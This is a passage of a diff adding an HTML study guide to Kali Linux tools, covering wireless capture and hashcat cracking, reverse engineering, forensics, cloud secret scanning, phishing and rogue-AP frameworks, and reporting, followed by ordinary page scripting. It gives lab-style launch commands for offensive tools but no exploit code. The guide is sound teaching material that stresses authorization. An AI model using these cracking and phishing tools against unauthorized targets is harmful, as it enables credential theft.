+hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt
+</code></pre>
+<h3 id="what-to-learn-here_5">What to learn here</h3>
+<ul>
+<li>Monitor mode</li>
+<li>Capture hygiene</li>
+<li>Difference between discovery, deauth, capture conversion, and cracking</li>
+<li>Why hardware compatibility matters much more in wireless than in web testing</li>
+</ul>
+<hr>
+<h2 id="12-reverse-engineering-mobile-and-firmware">12. Reverse Engineering, Mobile, and Firmware</h2>
+<p>Kali is not only for network attacks. It is also strong for understanding binaries, APKs, and firmware images.</p>
+<h3 id="key-tools-to-learn_8">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/ghidra/">Ghidra</a></td>
+<td>GUI reverse engineering suite</td>
+<td><code>ghidra</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/radare2/">radare2</a></td>
+<td>Powerful terminal-first reverse engineering</td>
+<td><code>r2 suspicious.bin</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/rizin/">Rizin</a></td>
+<td>Modern RE framework fork</td>
+<td><code>rizin suspicious.bin</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/rizin-cutter/">Cutter</a></td>
+<td>GUI for Rizin workflows</td>
+<td><code>cutter</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/gdb/">gdb</a></td>
+<td>Native debugging</td>
+<td><code>gdb ./vuln</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/jadx/">jadx</a></td>
+<td>Android decompiler</td>
+<td><code>jadx-gui app.apk</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/apktool/">apktool</a></td>
+<td>Decode and rebuild APK resources</td>
+<td><code>apktool d app.apk -o app-src</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/binwalk/">binwalk</a></td>
+<td>Firmware analysis and extraction</td>
+<td><code>binwalk -e firmware.bin</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/binwalk3/">binwalk3</a></td>
+<td>Next-generation Rust implementation</td>
+<td><code>binwalk3 firmware.bin</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-scenario_2">Mini-scenario</h3>
+<p>You download a firmware blob from a vendor support page and want to know what is inside:</p>
+<pre><code class="language-bash">binwalk -e firmware.bin
+strings firmware.bin | less
+ghidra
+</code></pre>
+<h3 id="what-to-learn-here_6">What to learn here</h3>
+<ul>
+<li>Static versus dynamic analysis</li>
+<li>GUI-first versus terminal-first RE workflows</li>
+<li>Android resource decoding versus Java/Kotlin decompilation</li>
+<li>Why firmware is often just many smaller file systems and archives glued together</li>
+</ul>
+<h3 id="upstream-docs-worth-bookmarking_5">Upstream docs worth bookmarking</h3>
+<ul>
+<li>Ghidra docs: <a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a></li>
+</ul>
+<hr>
+<h2 id="13-forensics-incident-response-and-recovery">13. Forensics, Incident Response, and Recovery</h2>
+<p>Kali is also a DFIR box. If you only associate it with offense, you are missing a big part of what it can do.</p>
+<h3 id="key-tools-to-learn_9">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/autopsy/">Autopsy</a></td>
+<td>GUI forensic analysis</td>
+<td><code>autopsy</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/sleuthkit/">Sleuth Kit</a></td>
+<td>File system and disk image analysis</td>
+<td><code>mmls disk.img</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/bulk-extractor/">bulk-extractor</a></td>
+<td>Recover structured artifacts from images</td>
+<td><code>bulk_extractor -o be-out disk.img</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/yara/">YARA</a></td>
+<td>Pattern-based artifact matching</td>
+<td><code>yara -r rules.yar samples/</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/plaso/">Plaso</a></td>
+<td>Timeline generation</td>
+<td><code>plaso-log2timeline timeline.plaso disk.img</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/foremost/">Foremost</a></td>
+<td>File carving</td>
+<td><code>foremost -i disk.img -o foremost-out</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/scalpel/">Scalpel</a></td>
+<td>File carving</td>
+<td><code>scalpel disk.img -o scalpel-out</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/testdisk/">TestDisk / PhotoRec</a></td>
+<td>Partition recovery and file recovery</td>
+<td><code>testdisk disk.img</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/binwalk/">binwalk</a></td>
+<td>Embedded and firmware artifact extraction</td>
+<td><code>binwalk -e firmware.bin</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-workflow-example_5">Mini-workflow example</h3>
+<pre><code class="language-bash">mmls disk.img
+fls -r -m / disk.img &gt; bodyfile.txt
+mactime -b bodyfile.txt &gt; timeline.txt
+bulk_extractor -o artifacts disk.img
+yara -r rules.yar recovered/
+</code></pre>
+<h3 id="what-to-learn-here_7">What to learn here</h3>
+<ul>
+<li>Timeline thinking</li>
+<li>Metadata versus content</li>
+<li>Recovery versus analysis</li>
+<li>Why "found on disk" is not the same as "executed"</li>
+</ul>
+<hr>
+<h2 id="14-cloud-secrets-and-code-focused-security-work">14. Cloud, Secrets, and Code-Focused Security Work</h2>
+<p>Modern pentesting often includes cloud accounts, public buckets, CI/CD leaks, and secret scanning. Kali has enough tooling here to be useful even if your target is mostly code and cloud.</p>
+<h3 id="key-tools-to-learn_10">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/cloud-enum/">cloud-enum</a></td>
+<td>Search for public cloud naming exposures</td>
+<td><code>cloud_enum -k companyname</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/pacu/">Pacu</a></td>
+<td>AWS-focused exploitation and audit framework</td>
+<td><code>pacu</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/gitleaks/">gitleaks</a></td>
+<td>Secret scanning in code repos</td>
+<td><code>gitleaks detect -s ./repo</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/trufflehog/">trufflehog</a></td>
+<td>Secret discovery across repos and file systems</td>
+<td><code>trufflehog filesystem ./repo</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/httpx-toolkit/">httpx-toolkit</a></td>
+<td>Validate exposed HTTP assets quickly</td>
+<td><code>httpx-toolkit -l assets.txt -title -tech-detect</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-scenario_3">Mini-scenario</h3>
+<p>You have permission to review an internal app repo and its cloud footprint:</p>
+<pre><code class="language-bash">gitleaks detect -s ./repo
+trufflehog filesystem ./repo
+cloud_enum -k companyname
+</code></pre>
+<h3 id="what-to-learn-here_8">What to learn here</h3>
+<ul>
+<li>Secret scanning before exploitation</li>
+<li>Asset validation before cloud testing</li>
+<li>Why cloud assessments require extremely careful scope control</li>
+</ul>
+<hr>
+<h2 id="15-social-engineering-tools">15. Social Engineering Tools</h2>
+<p>Kali includes social engineering tooling, but this is where ethical boundaries and authorization matter the most. Use these only in awareness training, explicit red team exercises, or isolated local labs.</p>
+<h3 id="key-tools-to-know">Key tools to know</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Starter command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/set/">SET / Social-Engineer Toolkit</a></td>
+<td>Guided social engineering simulations</td>
+<td><code>setoolkit</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/beef-xss/">BeEF-XSS</a></td>
+<td>Browser exploitation framework for labs</td>
+<td><code>beef-xss</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/evilginx2/">evilginx2</a></td>
+<td>Phishing simulation framework for authorized exercises only</td>
+<td><code>evilginx2</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/wifipumpkin3/">wifipumpkin3</a></td>
+<td>Rogue AP lab framework</td>
+<td><code>sudo wifipumpkin3</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="how-to-study-this-safely">How to study this safely</h3>
+<ul>
+<li>Focus on defenses and awareness outcomes, not just the offensive mechanics</li>
+<li>Practice only in isolated labs</li>
+<li>Document pre-approval, scope, and success criteria before any real engagement</li>
+</ul>
+<hr>
+<h2 id="16-reporting-screenshots-and-team-workflow">16. Reporting, Screenshots, and Team Workflow</h2>
+<p>A pentest is not complete when you "get a shell". It is complete when you can explain the risk, prove the path, show impact, and recommend a fix.</p>
+<h3 id="key-tools-to-learn_11">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/eyewitness/">EyeWitness</a></td>
+<td>Screenshot web services and management portals</td>
+<td><code>eyewitness --web -f urls.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/gowitness/">GoWitness</a></td>
+<td>Fast screenshots and visual asset review</td>
+<td><code>gowitness scan file -f urls.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/witnessme/">WitnessMe</a></td>
+<td>Screenshot and asset evidence collection</td>
+<td><code>witnessme -f urls.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/python-faraday/">Faraday</a></td>
+<td>Collaborative security workspace and reporting</td>
+<td><code>faraday-server</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="reporting-mindset">Reporting mindset</h3>
+<p>For every real finding, capture:</p>
+<ul>
+<li>affected asset</li>
+<li>proof of access or proof of weakness</li>
+<li>exact steps to reproduce</li>
+<li>screenshots or raw output</li>
+<li>business impact</li>
+<li>remediation advice</li>
+</ul>
+<p>If you cannot explain the finding clearly, you probably do not understand it deeply enough yet.</p>
+<hr>
+<h2 id="17-a-good-kali-study-roadmap">17. A Good Kali Study Roadmap</h2>
+<p>Here is a realistic way to learn Kali without drowning in it.</p>
+<h3 id="stage-1-learn-kali-itself">Stage 1: Learn Kali itself</h3>
+<p>Goals:</p>
+<ul>
+<li>Update the system correctly</li>
+<li>Install metapackages</li>
+<li>Use <code>man</code>, <code>--help</code>, and <code>/usr/share/seclists</code></li>
+<li>Work in snapshots</li>
+</ul>
+<p>Practice:</p>
+<pre><code class="language-bash">sudo apt update
+sudo apt full-upgrade -y
+sudo apt install -y kali-tools-information-gathering kali-tools-web
+</code></pre>
+<h3 id="stage-2-learn-recon-and-validation">Stage 2: Learn recon and validation</h3>
+<p>Master first:</p>
+<ul>
+<li><code>nmap</code></li>
+<li><code>amass</code></li>
+<li><code>subfinder</code></li>
+<li><code>httpx-toolkit</code></li>
+<li><code>whatweb</code></li>
+<li><code>nuclei</code></li>
+</ul>
+<p>Target mindset:</p>
+<ul>
+<li>Build asset inventory</li>
+<li>Confirm what is live</li>
+<li>Avoid noisy guessing before you understand the surface</li>
+</ul>
+<h3 id="stage-3-learn-web-testing">Stage 3: Learn web testing</h3>
+<p>Master first:</p>
+<ul>
+<li><code>burpsuite</code></li>
+<li><code>zaproxy</code></li>
+<li><code>gobuster</code></li>
+<li><code>ffuf</code></li>
+<li><code>sqlmap</code></li>
+</ul>
+<p>Practice targets:</p>
+<ul>
+<li>OWASP Juice Shop</li>
+<li>DVWA</li>
+<li>Other intentionally vulnerable web labs you control</li>
+</ul>
+<h3 id="stage-4-learn-passwords-and-ad">Stage 4: Learn passwords and AD</h3>
+<p>Master first:</p>
+<ul>
+<li><code>hashcat</code></li>
+<li><code>john</code></li>
+<li><code>netexec</code></li>
+<li><code>impacket</code></li>
+<li><code>bloodhound-ce-python</code></li>
+<li><code>certipy-ad</code></li>
+</ul>
+<h3 id="stage-5-learn-packets-and-wireless">Stage 5: Learn packets and wireless</h3>
+<p>Master first:</p>
+<ul>
+<li><code>tcpdump</code></li>
+<li><code>wireshark</code></li>
+<li><code>bettercap</code></li>
+<li><code>aircrack-ng</code></li>
+<li><code>hcxtools</code></li>
+<li><code>kismet</code></li>
+</ul>
+<h3 id="stage-6-learn-reverse-engineering-and-forensics">Stage 6: Learn reverse engineering and forensics</h3>
+<p>Master first:</p>
+<ul>
+<li><code>ghidra</code></li>
+<li><code>gdb</code></li>
+<li><code>jadx</code></li>
+<li><code>binwalk</code></li>
+<li><code>autopsy</code></li>
+<li><code>sleuthkit</code></li>
+<li><code>yara</code></li>
+</ul>
+<h3 id="a-strong-beginner-to-intermediate-order">A strong beginner-to-intermediate order</h3>
+<p>If you only focus on 12 tools first, make them these:</p>
+<ol>
+<li><code>nmap</code></li>
+<li><code>burpsuite</code></li>
+<li><code>ffuf</code></li>
+<li><code>whatweb</code></li>
+<li><code>nuclei</code></li>
+<li><code>hashcat</code></li>
+<li><code>john</code></li>
+<li><code>metasploit-framework</code></li>
+<li><code>wireshark</code></li>
+<li><code>netexec</code></li>
+<li><code>impacket</code></li>
+<li><code>ghidra</code></li>
+</ol>
+<p>That set gives you coverage across network, web, credentials, AD, traffic, exploitation, and binaries.</p>
+<hr>
+<h2 id="18-documentation-hub">18. Documentation Hub</h2>
+<p>Use the official Kali tool page first whenever possible. It is often the fastest path because it gives you package info, commands, and an upstream project link in one place.</p>
+<h3 id="kali-foundation-docs">Kali foundation docs</h3>
+<ul>
+<li>Kali docs home: <a href="https://www.kali.org/docs/">https://www.kali.org/docs/</a></li>
+<li>All Kali tools: <a href="https://www.kali.org/tools/all-tools/">https://www.kali.org/tools/all-tools/</a></li>
+<li>Kali metapackages: <a href="https://www.kali.org/docs/general-use/metapackages/">https://www.kali.org/docs/general-use/metapackages/</a></li>
+<li>Should I Use Kali Linux?: <a href="https://www.kali.org/docs/introduction/should-i-use-kali-linux/">https://www.kali.org/docs/introduction/should-i-use-kali-linux/</a></li>
+<li>Updating Kali: <a href="https://www.kali.org/docs/general-use/updating-kali/">https://www.kali.org/docs/general-use/updating-kali/</a></li>
+<li>Kali sources list: <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/</a></li>
+</ul>
+<h3 id="major-tool-pages-in-kali">Major tool pages in Kali</h3>
+<ul>
+<li>Nmap: <a href="https://www.kali.org/tools/nmap/">https://www.kali.org/tools/nmap/</a></li>
+<li>Burp Suite: <a href="https://www.kali.org/tools/burpsuite/">https://www.kali.org/tools/burpsuite/</a></li>
+<li>OWASP ZAP: <a href="https://www.kali.org/tools/zaproxy/">https://www.kali.org/tools/zaproxy/</a></li>
+<li>Gobuster: <a href="https://www.kali.org/tools/gobuster/">https://www.kali.org/tools/gobuster/</a></li>
+<li>ffuf: <a href="https://www.kali.org/tools/ffuf/">https://www.kali.org/tools/ffuf/</a></li>
+<li>sqlmap: <a href="https://www.kali.org/tools/sqlmap/">https://www.kali.org/tools/sqlmap/</a></li>
+<li>Hashcat: <a href="https://www.kali.org/tools/hashcat/">https://www.kali.org/tools/hashcat/</a></li>
+<li>John: <a href="https://www.kali.org/tools/john/">https://www.kali.org/tools/john/</a></li>
+<li>Hydra: <a href="https://www.kali.org/tools/hydra/">https://www.kali.org/tools/hydra/</a></li>
+<li>Metasploit Framework: <a href="https://www.kali.org/tools/metasploit-framework/">https://www.kali.org/tools/metasploit-framework/</a></li>
+<li>ExploitDB/Searchsploit: <a href="https://www.kali.org/tools/exploitdb/">https://www.kali.org/tools/exploitdb/</a></li>
+<li>Impacket: <a href="https://www.kali.org/tools/impacket/">https://www.kali.org/tools/impacket/</a></li>
+<li>NetExec: <a href="https://www.kali.org/tools/netexec/">https://www.kali.org/tools/netexec/</a></li>
+<li>BloodHound CE Python: <a href="https://www.kali.org/tools/bloodhound-ce-python/">https://www.kali.org/tools/bloodhound-ce-python/</a></li>
+<li>Certipy-ad: <a href="https://www.kali.org/tools/certipy-ad/">https://www.kali.org/tools/certipy-ad/</a></li>
+<li>Wireshark: <a href="https://www.kali.org/tools/wireshark/">https://www.kali.org/tools/wireshark/</a></li>
+<li>Bettercap: <a href="https://www.kali.org/tools/bettercap/">https://www.kali.org/tools/bettercap/</a></li>
+<li>aircrack-ng: <a href="https://www.kali.org/tools/aircrack-ng/">https://www.kali.org/tools/aircrack-ng/</a></li>
+<li>Kismet: <a href="https://www.kali.org/tools/kismet/">https://www.kali.org/tools/kismet/</a></li>
+<li>Ghidra: <a href="https://www.kali.org/tools/ghidra/">https://www.kali.org/tools/ghidra/</a></li>
+<li>jadx: <a href="https://www.kali.org/tools/jadx/">https://www.kali.org/tools/jadx/</a></li>
+<li>apktool: <a href="https://www.kali.org/tools/apktool/">https://www.kali.org/tools/apktool/</a></li>
+<li>binwalk: <a href="https://www.kali.org/tools/binwalk/">https://www.kali.org/tools/binwalk/</a></li>
+<li>Autopsy: <a href="https://www.kali.org/tools/autopsy/">https://www.kali.org/tools/autopsy/</a></li>
+<li>Sleuth Kit: <a href="https://www.kali.org/tools/sleuthkit/">https://www.kali.org/tools/sleuthkit/</a></li>
+<li>YARA: <a href="https://www.kali.org/tools/yara/">https://www.kali.org/tools/yara/</a></li>
+</ul>
+<h3 id="upstream-docs-that-are-especially-useful">Upstream docs that are especially useful</h3>
+<ul>
+<li>Nmap reference guide: <a href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></li>
+<li>Burp Suite docs: <a href="https://portswigger.net/burp/documentation">https://portswigger.net/burp/documentation</a></li>
+<li>OWASP ZAP docs: <a href="https://www.zaproxy.org/docs/">https://www.zaproxy.org/docs/</a></li>
+<li>Metasploit docs: <a href="https://docs.metasploit.com/">https://docs.metasploit.com/</a></li>
+<li>Hashcat wiki: <a href="https://hashcat.net/wiki/">https://hashcat.net/wiki/</a></li>
+<li>John docs: <a href="https://www.openwall.com/john/doc/">https://www.openwall.com/john/doc/</a></li>
+<li>Wireshark docs: <a href="https://www.wireshark.org/docs/">https://www.wireshark.org/docs/</a></li>
+<li>Ghidra home and docs: <a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a></li>
+</ul>
+<hr>
+<h2 id="final-advice">Final Advice</h2>
+<p>The most important thing to understand about Kali is this: <strong>Kali is a workflow platform, not a magic exploit button</strong>.</p>
+<p>If you can do these five things well, you are using Kali correctly:</p>
+<ol>
+<li>define scope carefully</li>
+<li>gather evidence before you guess</li>
+<li>choose the right tool family for the job</li>
+<li>keep clean notes and screenshots</li>
+<li>explain impact and remediation clearly</li>
+</ol>
+<p>The people who get the most out of Kali are not the people who know the most commands. They are the people who know when to stop scanning, when to pivot, when to validate manually, and how to turn raw tool output into a believable security story.</p></main>
+</div>
+<button id="toTop" aria-label="Back to top">
+  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
+</button>
+<script>
+(function(){
+  'use strict';
+  var ESC={'&':'&amp;','<':'&lt;','>':'&gt;'};
+  function esc(s){return s.replace(/[&<>]/g,function(c){return ESC[c];});}
+
+  /* ---------- lightweight syntax highlighting ---------- */
+  // Generic token-rule engine. Each rule: {re, cls}. First match at pos wins.
+  function tokenize(src, rules){
+    var out='', i=0, n=src.length, guard=0;
+    while(i<n && guard++<200000){
+      var matched=false;
+      for(var r=0;r<rules.length;r++){
+        rules[r].re.lastIndex=i;
+        var m=rules[r].re.exec(src);
+        if(m && m.index===i && m[0].length>0){
+          out+= rules[r].cls? '<span class="'+rules[r].cls+'">'+esc(m[0])+'</span>' : esc(m[0]);
+          i+=m[0].length; matched=true; break;
+        }
+      }
+      if(!matched){ out+=esc(src[i]); i++; }
+    }
+    if(i<n) out+=esc(src.slice(i));
+    return out;
+  }
+  var DIRECTIVES=('reverse_proxy file_server root encode header redir rewrite respond tls log '
+    +'basic_auth forward_auth handle handle_path handle_errors import route uri templates '
+    +'try_files metrics tracing request_body skip_log map vars push bind').split(' ');
+  var GLOBALS=('email acme_ca admin default_sni order debug auto_https on_demand_tls servers '
+    +'storage grace_period http_port https_port').split(' ');
+  function caddyRules(){
+    var dir='\\b(?:'+DIRECTIVES.concat(GLOBALS).join('|')+')\\b';
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/\{[^{}\n]*\}/g, cls:'ph'},          // placeholders {http.request.host}
+      {re:/@[A-Za-z0-9_-]+/g, cls:'m'},        // named matchers
+      {re:new RegExp(dir,'g'), cls:'k'},
+      {re:/\b\d+(?:\.\d+)?(?:ms|s|m|h|d|[KMGT]i?B?)?\b/g, cls:'n'},
+      {re:/^[ \t]*(?:https?:\/\/)?[A-Za-z0-9*][A-Za-z0-9.\-*]*\.[A-Za-z][A-Za-z0-9.\-:]*(?=[ ,{])/gm, cls:'site'},
+      {re:/[:|]\d{2,5}\b/g, cls:'site'},
+      {re:/[{}]/g, cls:'p'}
+    ];
+  }
+  function bashRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/'(?:[^'\\]|\\.)*'/g, cls:'s'},
+      {re:/\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*/g, cls:'ph'},
+      {re:/\b(sudo|curl|apt|dnf|brew|pacman|scoop|choco|go|xcaddy|caddy|systemctl|journalctl|docker|openssl|ulimit|export|chmod|mv|tee|gpg)\b/g, cls:'k'},
+      {re:/\s-{1,2}[A-Za-z][\w-]*/g, cls:'n'}
+    ];
+  }
+  function jsonRules(){
+    return [
+      {re:/"(?:[^"\\]|\\.)*"(?=\s*:)/g, cls:'a'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/\b(true|false|null)\b/g, cls:'b'},
+      {re:/-?\b\d+(?:\.\d+)?\b/g, cls:'n'},
+      {re:/[{}\[\],:]/g, cls:'p'}
+    ];
+  }
+  var NGINX_KW=('http events main stream upstream server location map geo types charset_map split_clients '
+    +'listen server_name root alias index autoindex try_files return rewrite error_page internal default_type '
+    +'include set if set_real_ip_from real_ip_header real_ip_recursive '
+    +'proxy_pass proxy_set_header proxy_http_version proxy_buffering proxy_buffers proxy_buffer_size '
+    +'proxy_cache proxy_cache_path proxy_cache_valid proxy_cache_key proxy_cache_use_stale proxy_cache_lock '
+    +'proxy_read_timeout proxy_connect_timeout proxy_send_timeout proxy_redirect proxy_ssl_server_name proxy_pass_request_headers '
+    +'fastcgi_pass fastcgi_param fastcgi_cache fastcgi_index scgi_pass uwsgi_pass grpc_pass '
+    +'ssl_certificate ssl_certificate_key ssl_protocols ssl_ciphers ssl_prefer_server_ciphers ssl_session_cache '
+    +'ssl_session_timeout ssl_session_tickets ssl_stapling ssl_stapling_verify ssl_dhparam ssl_early_data ssl_trusted_certificate '
+    +'resolver resolver_timeout http2 http3 quic '
+    +'gzip gzip_types gzip_comp_level gzip_min_length gzip_vary gzip_proxied brotli brotli_types brotli_comp_level '
+    +'add_header add_trailer expires etag sendfile sendfile_max_chunk tcp_nopush tcp_nodelay keepalive_timeout keepalive keepalive_requests '
+    +'worker_processes worker_connections worker_rlimit_nofile worker_priority multi_accept use pid user '
+    +'client_max_body_size client_body_buffer_size client_body_timeout client_header_timeout large_client_header_buffers send_timeout '
+    +'limit_req limit_req_zone limit_req_status limit_conn limit_conn_zone limit_conn_status limit_rate limit_rate_after '
+    +'access_log error_log log_format open_log_file_cache stub_status open_file_cache open_file_cache_valid '
+    +'allow deny auth_basic auth_basic_user_file satisfy auth_request '
+    +'least_conn ip_hash hash zone server weight max_fails fail_timeout backup down slow_start '
+    +'absolute_redirect server_tokens merge_slashes underscores_in_headers types_hash_max_size variables_hash_max_size').split(' ');
+  var NGINX_CONST=('on off break last permanent redirect reuseport ssl default_server deferred '
+    +'spdy fastopen rcvbuf sndbuf').split(' ');
+  function nginxRules(){
+    var kw='\\b(?:'+NGINX_KW.join('|')+')\\b';
+    var cn='\\b(?:'+NGINX_CONST.join('|')+')\\b';
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, cls:'s'},
+      {re:/\$\{?[A-Za-z_][A-Za-z0-9_]*\}?/g, cls:'ph'},
+      {re:new RegExp(kw,'g'), cls:'k'},
+      {re:new RegExp(cn,'g'), cls:'b'},
+      {re:/~\*?|\^~|=(?=\s)/g, cls:'m'},
+      {re:/\b\d+(?:\.\d+)*(?:ms|[smhdMG]|k|m|g)?\b/g, cls:'n'},
+      {re:/[{};]/g, cls:'p'}
+    ];
+  }
+  function yamlRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, cls:'s'},
+      {re:/^[ \t-]*[A-Za-z0-9_.\-]+(?=\s*:)/gm, cls:'a'},
+      {re:/\b(true|false|null|yes|no)\b/g, cls:'b'},
+      {re:/\b\d+(?:\.\d+)?\b/g, cls:'n'}
+    ];
+  }
+  function iniRules(){
+    return [
+      {re:/[#;][^\n]*/g, cls:'c'},
+      {re:/^\[[^\]\n]+\]/gm, cls:'k'},
+      {re:/^[A-Za-z0-9_.\-]+(?=\s*=)/gm, cls:'a'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'}
+    ];
+  }
+  function dockerRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/^\s*(FROM|RUN|COPY|CMD|ENV|EXPOSE|WORKDIR|ENTRYPOINT|ARG|LABEL|VOLUME|USER|AS)\b/gmi, cls:'k'},
+      {re:/"(?:[^"\\]|\\.)*"/g, cls:'s'},
+      {re:/\s-{1,2}[A-Za-z][\w-]*/g, cls:'n'}
+    ];
+  }
+  function defaultRules(){
+    return [
+      {re:/#[^\n]*/g, cls:'c'},
+      {re:/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, cls:'s'}
+    ];
+  }
+  function rulesFor(lang){
+    switch(lang){
+      case 'caddyfile': case 'caddy': return caddyRules();
+      case 'bash': case 'sh': case 'shell': case 'console': case 'powershell': return bashRules();
+      case 'json': return jsonRules();
+      case 'nginx': return nginxRules();
+      case 'yaml': case 'yml': return yamlRules();
+      case 'ini': case 'toml': case 'systemd': return iniRules();
+      case 'dockerfile': case 'docker': return dockerRules();
+      case 'html': case 'xml': return defaultRules();
+      default: return null;
+    }
+  }
+  var LANGLABEL={caddyfile:'Caddyfile',caddy:'Caddyfile',bash:'bash',sh:'bash',shell:'bash',
+    console:'bash',powershell:'PowerShell',json:'JSON',nginx:'nginx',yaml:'YAML',yml:'YAML',
+    ini:'ini',toml:'TOML',systemd:'systemd',dockerfile:'Dockerfile',docker:'Dockerfile',
+    html:'HTML',text:'text'};
+
+  function enhanceCode(){
+    document.querySelectorAll('main pre > code').forEach(function(code){
+      var pre=code.parentNode;
+      if(pre.parentNode.classList && pre.parentNode.classList.contains('codewrap')) return;
+      var cls=code.className||'';
+      var lm=cls.match(/language-([\w-]+)/);
+      var lang=lm?lm[1].toLowerCase():'text';
+      var raw=code.textContent;
+      // highlight
+      var rules=rulesFor(lang);
+      if(rules){ try{ code.innerHTML=tokenize(raw,rules);}catch(e){ code.textContent=raw; } }
+      // wrap
+      var wrap=document.createElement('div'); wrap.className='codewrap';
+      var bar=document.createElement('div'); bar.className='codebar';
+      var label=document.createElement('span'); label.className='lang';
+      label.textContent=LANGLABEL[lang]||lang;
+      var btn=document.createElement('button'); btn.className='copybtn'; btn.type='button';
+      btn.innerHTML='<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+      btn.addEventListener('click',function(){
+        navigator.clipboard.writeText(raw).then(function(){
+          btn.classList.add('ok'); btn.querySelector('span').textContent='Copied';
+          setTimeout(function(){btn.classList.remove('ok');btn.querySelector('span').textContent='Copy';},1400);
+        });
+      });
+      bar.appendChild(label); bar.appendChild(btn);
+      pre.parentNode.insertBefore(wrap,pre);
+      wrap.appendChild(bar); wrap.appendChild(pre);
+    });
+  }
+
+  /* ---------- wrap tables for horizontal scroll ---------- */
+  function wrapTables(){
+    document.querySelectorAll('main table').forEach(function(t){
+      if(t.parentNode.classList.contains('tablewrap'))return;
+      var w=document.createElement('div'); w.className='tablewrap';
+      t.parentNode.insertBefore(w,t); w.appendChild(t);
+    });
+  }
+
+  /* ---------- scroll-spy + progress ---------- */
+  function setupSpy(){
+    var links=[].slice.call(document.querySelectorAll('.toc a'));
+    var map={}; links.forEach(function(a){map[a.dataset.target]=a;});
+    var heads=[].slice.call(document.querySelectorAll('main h2[id], main h3[id]'));
+    var prog=document.getElementById('progress');
+    function onScroll(){
+      var y=window.scrollY, h=document.documentElement;
+      var max=h.scrollHeight-h.clientHeight;
+      prog.style.width=(max>0?(y/max*100):0)+'%';
+      var cur=null;
+      for(var i=0;i<heads.length;i++){
+        if(heads[i].getBoundingClientRect().top<=90) cur=heads[i]; else break;
+      }
+      links.forEach(function(a){a.classList.remove('active');});
+      if(cur && map[cur.id]){
